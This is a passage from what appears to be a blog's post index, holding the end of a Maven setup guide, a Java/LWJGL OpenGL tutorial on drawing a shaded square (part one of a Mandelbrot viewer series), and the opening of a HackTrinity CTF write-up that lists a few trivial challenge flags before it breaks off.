&amp;lt;artifactId&amp;gt;lwjgl-bom&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;${lwjgl.version}&amp;lt;/version&amp;gt; &amp;lt;scope&amp;gt;import&amp;lt;/scope&amp;gt; &amp;lt;type&amp;gt;pom&amp;lt;/type&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; &amp;lt;/dependencyManagement&amp;gt; &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-glfw&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-opengl&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-glfw&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-opengl&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.joml&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;joml&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;${joml.version}&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; &amp;lt;build&amp;gt; &amp;lt;plugins&amp;gt; &amp;lt;plugin&amp;gt; &amp;lt;artifactId&amp;gt;maven-assembly-plugin&amp;lt;/artifactId&amp;gt; &amp;lt;executions&amp;gt; &amp;lt;execution&amp;gt; &amp;lt;id&amp;gt;make-assembly&amp;lt;/id&amp;gt; &amp;lt;phase&amp;gt;package&amp;lt;/phase&amp;gt; &amp;lt;goals&amp;gt; &amp;lt;goal&amp;gt;single&amp;lt;/goal&amp;gt; &amp;lt;/goals&amp;gt; &amp;lt;/execution&amp;gt; &amp;lt;/executions&amp;gt; &amp;lt;configuration&amp;gt; &amp;lt;archive&amp;gt; &amp;lt;manifest&amp;gt; &amp;lt;mainClass&amp;gt;Application&amp;lt;/mainClass&amp;gt; &amp;lt;/manifest&amp;gt; &amp;lt;/archive&amp;gt; &amp;lt;descriptorRefs&amp;gt; &amp;lt;descriptorRef&amp;gt;jar-with-dependencies&amp;lt;/descriptorRef&amp;gt; &amp;lt;/descriptorRefs&amp;gt; &amp;lt;appendAssemblyId&amp;gt;false&amp;lt;/appendAssemblyId&amp;gt; &amp;lt;/configuration&amp;gt; &amp;lt;/plugin&amp;gt; &amp;lt;/plugins&amp;gt; &amp;lt;/build&amp;gt;&amp;lt;/project&amp;gt;Building your project from sourceIf you wish to distribute your project you can of course just send out the JAR file but if you want people to be able to build your project using your source code it is also quite simple. All you have to provide them is the pom.xml file and the folder called src from your project root directory. You can see an example of this on my github for the Mandelbrot Viewer. They can then simply import the pom.xml file into their respective IDE or compile the JAR file from the command line using the command mvn clean package in the project folder.With that, this tutorial is complete! You should now be able to quickly get setup when you want to start programming using OpenGL through Java and can easily package your program to distribute however you like. I hope you were able to learn something from this and will possibly use Maven for future projects of your own. If you wish to explore more of Maven’s capabilities as there are many you can check out its website. Thanks so much for reading!- Cian Jinks" }, { "title": "OpenGL Tutorial - Visualizing the Mandelbrot Set Fractal - Part 1 of 2", "url": "/posts/opengl-tutorial-visualizing-the-mandelbrot-set-fractal-part-1-of-2/", "categories": "Old", "tags": "opengl, lwjgl, fractal, tutorial", "date": "2020-05-16 13:00:00 +0100", "snippet": "Welcome to my first blog post/tutorial of many I hope to create on the topic of computer graphics programming using OpenGL. Over the past half a year or so I have been spending a large portion of my spare time teaching myself the ins and outs of the OpenGL api and in doing so have created some projects along the way. In this specific tutorial set I wanted to guide you through creating one of my earlier projects which I completed some time in January of 2020. That being a program which displays a stylised version of the Mandelbrot Set fractal pattern. I would have loved to have found all of this information condensed in one post when making it and so I hope this will be of benefit to you. In terms of the knowledge required to understand this tutorial, I wrote my programs in Java and would like this to be a tutorial one can learn from scratch with no prior OpenGL experience. I am going to attempt to explain the basic concepts in OpenGL as best I can meaning you will only need some experience with an object oriented programming language to understand it all. I will also regularly supply other sources for reading up on any concepts mentioned throughout.(If you simply wish to learn how to create the Mandelbrot Set shader please check out part two of this tutorial)One last thing before I dive right into the explanations is that a further updated and completed version of this project with all of the source code as well as compiled jars can be found over on my project’s github page called Mandelbrot-Viewer so I encourage giving that a look too.Getting StartedFirst things first for those who don’t know, what is OpenGL? OpenGL aims to be a cross platform computer graphics api. This means in theory you can use it to communicate with GPUs on various systems and platforms that exist today. However, note that I referred to it as an api. At its core OpenGL is simply a specification of commands that one should be able to send to their GPU to make it perform graphics calculations. It is generally up to third parties to provide the implementations of this api. Luckily for us OpenGL is relatively popular and so pretty much all modern graphics cards support it (although much older graphics cards only support up to specific versions) and there are bindings for it available in a wide variety of programming languages. For this tutorial I will be writing in Java and thus using LWJGL for the OpenGL bindings. LWJGL also comes with some other useful libraries with the most notable for us being GLFW which is used for the creation of an application window which we can then draw to on various operating systems. Since OpenGL is a specification any OpenGL methods that I do use throughout this tutorial should have a largely similar method signature using other bindings and languages making it hopefully no problem for following along.If you do want to follow this tutorial directly note that I selected the Minimal OpenGL configuration on LWJGL’s customize page and added the JOML math library addon. I also chose to use Maven for compiling my program and binaries. If you don’t know how Maven works I will soon be writing a tutorial about setting up a Maven Java project for OpenGL programming and will use this tutorial as an example.EDIT: That tutorial can now be found here.The WindowTo begin our program we are going to want to use GLFW to create a window for our respective operating system. I am using Windows for my OS but everything should work relatively the same cross platform. To do so is relatively simple as we can just head on over to the LWJGL starter page and grab their code for starting a window. I chose to place it in a class called Application. As for what this code does, it provides three functions named run, init and loop which are run consecutively when the program starts. Our window is created within init using glfwCreateWindow and some other configuration options are set. Most of these have explanatory comments provided however if you wish to investigate further as to what these various functions do you can check out GLFW’s documentation. Do note that examples are provided in C++ not Java. After glfwCreateWindow some key callbacks are set up which can be used to detect the pressing of keys. The only one used for the time being is the escape key to close the window. At the moment the only thing we wish to modify here would be the window proportions. For this project I chose to set the width and height to 480x480 (960x960 would also work fine, as would any square size) making for a perfect square which will simplify things later on.The next area of code we need to worry about is within loop. Here you will notice a while loop which waits until the window is closed before completing. This will act as our program’s main loop meaning in here we will place code we want to run every frame drawn to the screen (All code here should be placed before the glfwSwapBuffers function). Just to make sure that this starter code all works correctly we can go ahead and run the program and should be greeted with a square window colored red due to the glClearColor method in loop. For reference here is how our code should look so far:import org.lwjgl.*;import org.lwjgl.glfw.*;import org.lwjgl.opengl.*;import org.lwjgl.system.*;import java.nio.*;import static org.lwjgl.glfw.Callbacks.*;import static org.lwjgl.glfw.GLFW.*;import static org.lwjgl.opengl.GL11.*;import static org.lwjgl.system.MemoryStack.*;import static org.lwjgl.system.MemoryUtil.*;public class Application { // The window handle private long window; public void run() { System.out.println(&quot;Hello LWJGL &quot; + Version.getVersion() + &quot;!&quot;); init(); loop(); // Free the window callbacks and destroy the window glfwFreeCallbacks(window); glfwDestroyWindow(window); // Terminate GLFW and free the error callback glfwTerminate(); glfwSetErrorCallback(null).free(); } private void init() { // Setup an error callback. The default implementation // will print the error message in System.err. GLFWErrorCallback.createPrint(System.err).set(); // Initialize GLFW. Most GLFW functions will not work before doing this. if ( !glfwInit() ) throw new IllegalStateException(&quot;Unable to initialize GLFW&quot;); // Configure GLFW glfwDefaultWindowHints(); // optional, the current window hints are already the default glfwWindowHint(GLFW_VISIBLE, GLFW_FALSE); // the window will stay hidden after creation glfwWindowHint(GLFW_RESIZABLE, GLFW_TRUE); // the window will be resizable // Create the window window = glfwCreateWindow(960, 960, &quot;Hello World!&quot;, NULL, NULL); if ( window == NULL ) throw new RuntimeException(&quot;Failed to create the GLFW window&quot;); // Setup a key callback. It will be called every time a key is pressed, repeated or released. glfwSetKeyCallback(window, (window, key, scancode, action, mods) -&amp;gt; { if ( key == GLFW_KEY_ESCAPE &amp;amp;&amp;amp; action == GLFW_RELEASE ) glfwSetWindowShouldClose(window, true); // We will detect this in the rendering loop }); // Get the thread stack and push a new frame try ( MemoryStack stack = stackPush() ) { IntBuffer pWidth = stack.mallocInt(1); // int* IntBuffer pHeight = stack.mallocInt(1); // int* // Get the window size passed to glfwCreateWindow glfwGetWindowSize(window, pWidth, pHeight); // Get the resolution of the primary monitor GLFWVidMode vidmode = glfwGetVideoMode(glfwGetPrimaryMonitor()); // Center the window glfwSetWindowPos( window, (vidmode.width() - pWidth.get(0)) / 2, (vidmode.height() - pHeight.get(0)) / 2 ); } // the stack frame is popped automatically // Make the OpenGL context current glfwMakeContextCurrent(window); // Enable v-sync glfwSwapInterval(1); // Make the window visible glfwShowWindow(window); } private void loop() { // This line is critical for LWJGL&#39;s interoperation with GLFW&#39;s // OpenGL context, or any context that is managed externally. // LWJGL detects the context that is current in the current thread, // creates the GLCapabilities instance and makes the OpenGL // bindings available for use. GL.createCapabilities(); // Set the clear color glClearColor(1.0f, 0.0f, 0.0f, 0.0f); // Run the rendering loop until the user has attempted to close // the window or has pressed the ESCAPE key. while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents(); } } public static void main(String[] args) { new Application().run(); }}This will produce the following window:VerticesNow that we have got the window set up it is nearly time to get to graphics programming. But first there are a few basic concepts that need to be understood. The way in which modern graphics work is that any shape, image or 3d mesh that one wishes to be rendered to a screen is made up of polygons. For more complex work there can sometimes be thousands of said polygons that make up a single shape or model. The most efficient form of polygons for graphics programming are triangles. Each triangle consists of three points and three lines joining all of those points together to form the triangle. Each of these points is what is referred to as a vertex and together they are vertices. However, you should not think of vertices as just the corners/points making up a triangle implying all they can contain is a position. While they do contain a position, in OpenGL these vertices can in fact contain all kinds of data about a given triangle such as color, texture coordinates, lighting information and more.For our program we will only need to render a simple square to the screen and won’t require the vertices to store anything more than their positions. One last thing to note is that, by default, positions in OpenGL range from -1.0 to 1.0 for the x and y coordinates of the screen. With that in mind here is how we would go about creating a square out of triangle polygons which fills the entire window (because the very bottom left in OpenGL is (-1.0, -1.0) and the top right is (1.0, 1.0)):As can be seen all that is needed is two right angled triangles joined together. These can be defined using just four vertices with positions of (-1.0, 1.0), (-1.0, -1.0), (1.0, -1.0) and (1.0, 1.0) so that they fill up the whole screen. In general, when implementing the handling of vertices in code, one would likely wish to create a Vertex class to allow the creation of an arbitrary number of vertices each with their unique data. However, in our case we only will be using four vertices so it is easier to just hardcode their position data into an array as follows (this code will be placed in our loop method before the actual main window while loop):// Vertices - Positionsfloat[] vertices = new float[] { -1.0f, 1.0f, // Vertex 0 -1.0f, -1.0f, // Vertex 1 1.0f, -1.0f, // Vertex 2 1.0f, 1.0f // Vertex 3};Vertex BuffersNow you might be asking yourself how is it that we actually pass this data to our graphics card through OpenGL? This is where the concept of a vertex buffer comes into play. A vertex buffer is simply an area of memory on your gpu which stores information about your various vertices. The way in which we actually place our data there is through the use of a few OpenGL functions which specify how our vertices will be laid out in memory and allow us to place the vertex data into that memory. Before any of that however, there is one more thing we must do in Java specifically which is to transfer our vertices array we created above to a FloatBuffer. This is common practice when using Java for OpenGL and if you wish to learn why that is I encourage doing some googling or checking out this stackoverflow post.// VBO (Vertex Buffer Object)FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length);for(float vertex : vertices) { vboBuffer.put(vertex);}vboBuffer.flip();You’ll notice that we needed to run flip on our buffer at the end. The reasoning for this can be found here.Now we can finally pass our data to our gpu through some functions provided by OpenGL:// Pass data to GPUint positionElementCount = vertices.length / 4;int vboID = GL30.glGenBuffers();GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID);GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer, GL30.GL_STATIC_DRAW);GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, positionElementCount * Float.BYTES, 0);GL30.glEnableVertexAttribArray(0);There is quite a bit going on here so I will try to break it down. However I don’t want to spend overly long on it so if you are still confused I highly recommend checking out the docs.gl website for further reading on what each function does and the various parameters that can be passed to it. (In this tutorial I use OpenGL 3.0 so when checking for functions on docs.gl select their gl3 counterpart).glGenBuffersHere we are telling OpenGL we wish to create a buffer on the gpu where we can store some information. This function will return us an ID in the form of an Integer which we can later use to reference this same buffer.glBindBufferWhen we want to modify a buffer we have created we must first bind it. When doing so we specify the type of buffer it is which in our case is a GL_ARRAY_BUFFER. If you check out the docs.gl page for glBindBuffer you’ll note it says this type of buffer is used for storing vertex attributes. Vertex attributes are the different pieces of data our vertex stores as mentioned before - position, color, texture coordinates, lighting information and anything else you may want.glBufferDataThis function is where we actually pass our vertices data to the gpu. We tell it the type of data that we are placing within the buffer which is once again vertex attributes (denoted by GL_ARRAY_BUFFER) and then we tell it to use GL_STATIC_DRAW. This means the data we pass is going to be used for drawing to the screen and will not be modified again in the future. As you might guess this means we cannot manipulate the vertices on the fly as the program is running which for us is all that we need. If you wish to learn about how one would do such a thing, to allow the moving of vertices and more, I will have another tutorial coming soon which I will link here.glVertexAttribPointerNow that we have provided our vertex data to the gpu how does it know what that data means? We need to explain to it the layout of our memory and what each byte is for. This is where glVertexAttribPointer is used. The first parameter which we have passed is 0. This simply tells the GPU this is our first vertex attribute. After that we need to tell it how many pieces of data make up that attribute. In our case we have four positions specified in our array where each position requires an x and a y. This means that each attribute is made up of two pieces of data. The type of this data is then specified next as GL_FLOAT in our case because each x and y position is a float. false then tells it this data is not normalised. The GPU still needs to know one more thing which is how many bytes each of our position attributes take up. You might wonder why this is necessary since it already knows their type and how many of that type are in each? However, when you have multiple different vertex attributes it needs to know where each one starts. In our case we have two floats worth of bytes which I have calculated by positionElementCount * Float.BYTES. Finally the last parameter tells it where the first occurence of this vertex attribute begins in our vertex buffer. Since this is our only vertex attribute it begins at position 0.Once again a much more detailed explanation of this function is found on its docs.gl page.glEnableVertexAttribArrayThis last function simply enables our first vertex attribute (index 0).With that out of the way our vertex buffer is now complete! Here is what our loop function should now look like in its entirety:private void loop() { // This line is critical for LWJGL&#39;s interoperation with GLFW&#39;s // OpenGL context, or any context that is managed externally. // LWJGL detects the context that is current in the current thread, // creates the GLCapabilities instance and makes the OpenGL // bindings available for use. GL.createCapabilities(); // Set the clear color glClearColor(1.0f, 0.0f, 0.0f, 0.0f); // Vertices - Positions float[] vertices = new float[] { -1.0f, 1.0f, // Vertex 0 -1.0f, -1.0f, // Vertex 1 1.0f, -1.0f, // Vertex 2 1.0f, 1.0f // Vertex 3 }; // VBO (Vertex Buffer Object) FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length); for(float vertex : vertices) { vboBuffer.put(vertex); } vboBuffer.flip(); // Pass data to GPU int positionElementCount = vertices.length / 4; int vboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID); GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer, GL30.GL_STATIC_DRAW); GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, positionElementCount * Float.BYTES, 0); GL30.glEnableVertexAttribArray(0); // Run the rendering loop until the user has attempted to close // the window or has pressed the ESCAPE key. while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents(); }}Index BuffersThe next important concept in OpenGL required for us to draw a square are index buffers. So far we have passed to the gpu the positions of our four vertices that are going to make up our square and explained how these positions are laid out in memory. However, we still haven’t explained to the gpu how it should make use of this data. How does it know to draw two right angled triangles using these vertex positions? This is where index buffers come into play. We can use an index buffer to specify which vertices make up our triangles by storing some indices within it:// Indicesint[] indices = new int[] { 0, 1, 2, 2, 3, 0};In this setup we are saying that one of our right angled triangles is going to be made up of vertex 0, 1 and 2 and the other will be made up of vertex 2, 3 and 0. Note that the order in which these are specified is counter clockwise with respect to the diagram shown in the vertices section of the tutorial.To pass these indices to the gpu we are going to create an index buffer. This process is much the same as the vertex buffer although slightly simpler:// IBO (Index Buffer Object)IntBuffer iboBuffer = BufferUtils.createIntBuffer(indices.length);for(int index : indices) { iboBuffer.put(index);}iboBuffer.flip();// Pass data to GPUint iboID = GL30.glGenBuffers();GL30.glBindBuffer(GL30.GL_ELEMENT_ARRAY_BUFFER, iboID);GL30.glBufferData(GL30.GL_ELEMENT_ARRAY_BUFFER, iboBuffer, GL30.GL_STATIC_DRAW);One slight difference from the vertex buffer is the use of GL_ELEMENT_ARRAY_BUFFER instead of GL_ARRAY_BUFFER. This type of buffer is used for storing vertex indices instead of vertex attributes.With that we are all done with our index buffers and our finalised code should look something like this:private void loop() { // This line is critical for LWJGL&#39;s interoperation with GLFW&#39;s // OpenGL context, or any context that is managed externally. // LWJGL detects the context that is current in the current thread, // creates the GLCapabilities instance and makes the OpenGL // bindings available for use. GL.createCapabilities(); // Set the clear color glClearColor(1.0f, 0.0f, 0.0f, 0.0f); // Vertices - Positions float[] vertices = new float[] { -1.0f, 1.0f, // Vertex 0 -1.0f, -1.0f, // Vertex 1 1.0f, -1.0f, // Vertex 2 1.0f, 1.0f // Vertex 3 }; // VBO (Vertex Buffer Object) FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length); for(float vertex : vertices) { vboBuffer.put(vertex); } vboBuffer.flip(); // Pass data to GPU int positionElementCount = vertices.length / 4; int vboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID); GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer, GL30.GL_STATIC_DRAW); GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, positionElementCount * Float.BYTES, 0); GL30.glEnableVertexAttribArray(0); // Indices int[] indices = new int[] { 0, 1, 2, 2, 3, 0 }; // IBO (Index Buffer Object) IntBuffer iboBuffer = BufferUtils.createIntBuffer(indices.length); for(int index : indices) { iboBuffer.put(index); } iboBuffer.flip(); // Pass data to GPU int iboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ELEMENT_ARRAY_BUFFER, iboID); GL30.glBufferData(GL30.GL_ELEMENT_ARRAY_BUFFER, iboBuffer, GL30.GL_STATIC_DRAW); // Run the rendering loop until the user has attempted to close // the window or has pressed the ESCAPE key. while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents(); }}If we want, we can now go ahead and try drawing our square using one more line of code in our main window loop:// Run the rendering loop until the user has attempted to close// the window or has pressed the ESCAPE key.while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our square glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents();}Here we are using glDrawElements to draw our vertices based on our index buffer which was a GL_ELEMENT_ARRAY_BUFFER. We use GL_TRIANGLES mode to specify we want it to take each group of three indices to form a triangle. After than we need to tell it how many indices we have placed in our index buffer up above which is simply the length of our array. Our indices are of course of type Integer and so we specify GL_UNSIGNED_INT. The very last parameter is a 0 as our indices start from index 0 in our index buffer.We can then run our program. If you do get a crash here and are using a different language or OpenGL binding to follow this tutorial it is possible that that OpenGL binding does not come with a default shader so you will have to create one using the next section of the tutorial first. Otherwise using LWJGL you should get a fully white window as your white square now fills the window:Just to be 100% sure that it is working we could modify the position of Vertex 0 to (-0.5, 1.0) which should reveal a slight bit of the original red background as our shape no longer covers that top left portion fully:ShadersSome of you may have already heard of shaders before. They are one of the biggest features of OpenGL and are what allow us to customise the look of our square as we please. Eventually we are going to write a shader which visualizes the mandelbrot set however for the time being, as a good introduction to shaders, we will simply write a shader to color our square purple. We won’t delve particularly deep into the various features offered by shaders here but if you wish to research further there are numerous resources online for doing so.The first thing you need to know is that shaders are written in their own programming language called GLSL (GL Shading Language). Don’t worry though, it is relatively simple to figure out if you already have experience programming in general. If you do end up wanting to learn much more about it after this tutorial you can check out this youtube series.Before we write any shaders of our own we first need to do some set up in our code for handling them. Since they’re going to be written in their own language it is common practice to store them in their own files. When we need to pass them to the gpu we will load them in from their respective file as a string. In java I will use a simple BufferedReader and it’s concept of streams to read in the contents of a file and return them as a string via the function parseShaderFromFile. In other languages and on other systems this will likely work differently and you will need to make sure that new line characters are captured accurately as well otherwise your shader will not compile and will produce no errors as we do not have any error handling implemented.private static String parseShaderFromFile(String filePath) { StringBuilder data = new StringBuilder(); String line = &quot;&quot;; try { BufferedReader reader = new BufferedReader(new InputStreamReader(Application.class.getResourceAsStream(filePath))); line = reader.readLine(); while( line != null ) { data.append(line); data.append(&#39;\\n&#39;); line = reader.readLine(); } } catch(Exception e) { throw new IllegalArgumentException(&quot;Unable to load shader from: &quot; + filePath, e); } return data.toString();}With that function setup we can then use it in our code to load in our shaders and send them to our gpu:// Shadersint programID = GL30.glCreateProgram();int vertShaderObj = GL30.glCreateShader(GL30.GL_VERTEX_SHADER);int fragShaderObj = GL30.glCreateShader(GL30.GL_FRAGMENT_SHADER);String vertexShader = parseShaderFromFile(&quot;/shaders/vert.shader&quot;);GL30.glShaderSource(vertShaderObj, vertexShader);GL30.glCompileShader(vertShaderObj);String fragmentShader = parseShaderFromFile(&quot;/shaders/frag.shader&quot;);GL30.glShaderSource(fragShaderObj, fragmentShader);GL30.glCompileShader(fragShaderObj);GL30.glAttachShader(programID, vertShaderObj);GL30.glAttachShader(programID, fragShaderObj);GL30.glLinkProgram(programID);GL30.glValidateProgram(programID);GL30.glUseProgram(programID);We do a good bit here so I will try my best to explain. First we must create a program for which to bind our shaders using glCreateProgram. There are multiple different types of shaders but by far the main two you should be aware of are Vertex shaders and Fragment shaders. Vertex shaders are run on each vertex of the polygon they are applied to and as a result are able to manipulate the various vertex attributes associated with them. On the other hand fragment shaders are run on every pixel in between these vertices meaning they can be used for texturing, coloring, lighting calculations and more. With that in mind we then use glCreateShader to tell the gpu we want a GL_VERTEX_SHADER and a GL_FRAGMENT_SHADER. This function will return an integer to act as a handler which we can use to reference that same shader again in the future. Next we have to provide this shader to the gpu using glShaderSource. Just before doing that you can see we load each shader from their respective file into a string using the parseShaderFromFile method. I am storing the shaders in a location relative to my maven project (specifically the resources folder) but your file path may of course be different.For a majority of the rest of the functions used here you get a basic idea of what they do from reading them and you don’t necessarily need to know what they do at a lower level but if you wish to delve deeper check out docs.gl once again.Finally we can begin writing our own shaders. For now we will simply color our square purple but in part two of this tutorial this is where we will write the code within the fragment shader to generate the mandelbrot set.Vertex Shader// /shaders/vert.shaderlayout(location = 0) in vec2 position;void main() { gl_Position = vec4(position, 0, 1.0);}This is going to be the basic outline for our vertex shader. The very first line takes in our vertex attribute placed at index 0 which is the position of each of our vertices that we set up way back in our vertex buffer. GLSL supports vectors which are made up of floats and since our position data is stored in groups of 2 floats we are going to store the position of the current vertex being processed by the shader in a vec2 (2 float vector) called position. After that we define a main which needs to be present in all shaders and provide that position to a special OpenGL variable called gl_Position. This variable is what internally determines the position of the current vertex being processed by our vertex shader. The reason for converting our position variable from a vec2 to a vec4 before passing it to gl_Position is because OpenGL uses an xyzw coordinate system. An explanation for the reasoning as to why there is an extra w coordinate can be found here.Fragment Shadervoid main() { gl_FragColor = vec4(0.3, 0.0, 0.3, 1.0);}Our fragment shader is even simpler than our vertex shader. All it does is set another built in OpenGL variable, that being gl_FragColor, which controls the color of the pixels between our vertices. In this case we are just setting it to a purple color in RGBA. RGBA values range from 0.0 to 1.0 in OpenGL instead of the usual 0 to 255.With that, we are all done! We can run our program and should see a nice purple window which is our square:This entire process may have seemed overly long and tedious just to produce a simple square but as we explore more in the next part of this tutorial and hopefully in future tutorials it will begin to become clear just how useful and powerful this all is. Once you begin to add layers of abstraction it can simplify things much further as well.For reference here is the loop function in its entirety along with parseShaderFromFile:private void loop() { // This line is critical for LWJGL&#39;s interoperation with GLFW&#39;s // OpenGL context, or any context that is managed externally. // LWJGL detects the context that is current in the current thread, // creates the GLCapabilities instance and makes the OpenGL // bindings available for use. GL.createCapabilities(); // Set the clear color glClearColor(1.0f, 0.0f, 0.0f, 0.0f); // Vertices - Positions float[] vertices = new float[] { -1.0f, 1.0f, // Vertex 0 -1.0f, -1.0f, // Vertex 1 1.0f, -1.0f, // Vertex 2 1.0f, 1.0f // Vertex 3 }; // VBO (Vertex Buffer Object) FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length); for(float vertex : vertices) { vboBuffer.put(vertex); } vboBuffer.flip(); // Pass data to GPU int positionElementCount = vertices.length / 4; int vboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID); GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer, GL30.GL_STATIC_DRAW); GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, positionElementCount * Float.BYTES, 0); GL30.glEnableVertexAttribArray(0); // Indices int[] indices = new int[] { 0, 1, 2, 2, 3, 0 }; // IBO (Index Buffer Object) IntBuffer iboBuffer = BufferUtils.createIntBuffer(indices.length); for(int index : indices) { iboBuffer.put(index); } iboBuffer.flip(); // Pass data to GPU int iboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ELEMENT_ARRAY_BUFFER, iboID); GL30.glBufferData(GL30.GL_ELEMENT_ARRAY_BUFFER, iboBuffer, GL30.GL_STATIC_DRAW); // Shaders int programID = GL30.glCreateProgram(); int vertShaderObj = GL30.glCreateShader(GL30.GL_VERTEX_SHADER); int fragShaderObj = GL30.glCreateShader(GL30.GL_FRAGMENT_SHADER); String vertexShader = parseShaderFromFile(&quot;/shaders/vert.shader&quot;); GL30.glShaderSource(vertShaderObj, vertexShader); GL30.glCompileShader(vertShaderObj); String fragmentShader = parseShaderFromFile(&quot;/shaders/frag.shader&quot;); GL30.glShaderSource(fragShaderObj, fragmentShader); GL30.glCompileShader(fragShaderObj); GL30.glAttachShader(programID, vertShaderObj); GL30.glAttachShader(programID, fragShaderObj); GL30.glLinkProgram(programID); GL30.glValidateProgram(programID); GL30.glUseProgram(programID); // Run the rendering loop until the user has attempted to close // the window or has pressed the ESCAPE key. while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our square glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents(); }}private static String parseShaderFromFile(String filePath) { StringBuilder data = new StringBuilder(); String line = &quot;&quot;; try { BufferedReader reader = new BufferedReader(new InputStreamReader(Application.class.getResourceAsStream(filePath))); line = reader.readLine(); while( line != null ) { data.append(line); data.append(&#39;\\n&#39;); line = reader.readLine(); } } catch(Exception e) { throw new IllegalArgumentException(&quot;Unable to load shader from: &quot; + filePath, e); } return data.toString();}Part 2The next part of this tutorial will cover some more advanced concepts such as how we can set up a simple camera using user input and an MVP Matrix (Model View Projection). That is also where we will write a fragment shader to visualize the Mandelbrot Set Fractal on our square and discuss some of its limitations. If you’ve already made it this far thanks so much for reading and I hope I was able to help you learn a bit along the way :D- Cian Jinks" }, { "title": "HackTrinity CTF Write Up", "url": "/posts/hacktrinity-ctf-write-up/", "categories": "Old", "tags": "ctf", "date": "2020-03-23 12:00:00 +0000", "snippet": "This last week I took part in my first ever CTF and therefore felt it appropriate to follow that with a write up of my own. The CTF was a collaboration between various societies at my university and was known as HackTrinity. This is my first ever write up and details solutions to the various challenges I was able to solve throughout the competition.ChallengesWelcomeThis was the first challenge in the competition and one of a few very simple ones. It acted as a simple tutorial to teach you the flag format and the solution was given. Flag: HackTrinity{well_that_was_easy}CHADThis challenge was another of the so-called simple challenges and simply acted as a tutorial for setting up the instances service used for some of the challenges. Once setup the flag is found by visiting the given URL. Flag: HackTrinity{rutabaga_span_id_tortellini}Trivia - UnknownThis was the first of the trivia challenges. Once again it was another easy one as you were given a quote and upon googling that quote you would quickly come to the conclusion that it was said by Crash Override from the movie Hackers. This flag was non standard format. Flag: Crash OverrideTrivia - NotBotsAgainTo some this challenge is commonn knowledge but a quick google search will also tell you the answer. This flag was non standard format. Flag: crossdomain.xmlReversing - Locked 